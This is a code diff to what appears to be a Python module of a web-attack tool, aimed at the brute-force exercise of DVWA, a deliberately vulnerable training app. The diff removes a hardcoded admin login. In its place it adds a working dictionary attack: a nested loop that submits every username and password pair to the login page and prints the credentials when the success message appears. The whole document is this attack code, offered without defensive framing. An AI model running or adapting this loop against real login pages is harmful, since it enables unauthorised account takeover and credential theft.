@@ -1,4 +1,4 @@
-from core.session import Session
+success_msg = 'Welcome to the password protected area'
 
 
 def attack(session, dict_user, users, dict_pass, passw):
@@ -19,18 +19,12 @@ def attack(session, dict_user, users, dict_pass, passw):
     else:
         passwords.extend(passw)
 
-    #for u in usernames:
-    #    u = u.rstrip('\n')
-    #    print(u)
-
-    #session.get_sess_infos('vulnerabilities/brute/', session.get_cookies())
-
-    dvwa_creds = {
-        'user': 'admin',
-        'pass': 'password'
-    }
-    print('\n\n\n')
-    session.login('vulnerabilities/brute/', dvwa_creds)
-
-    #print(session.get_session().text)
+    # Dictionary attack loop
+    for u in usernames:
+        u = u.rstrip('\n')
+        for p in passwords:
+            p = p.rstrip('\n')
+            page_content = session.login('vulnerabilities/brute/', u, p)
+            if success_msg in page_content:
+                print("   Credentials found!\n   Username: {}\n   Password: {}\n".format(u,p))
 
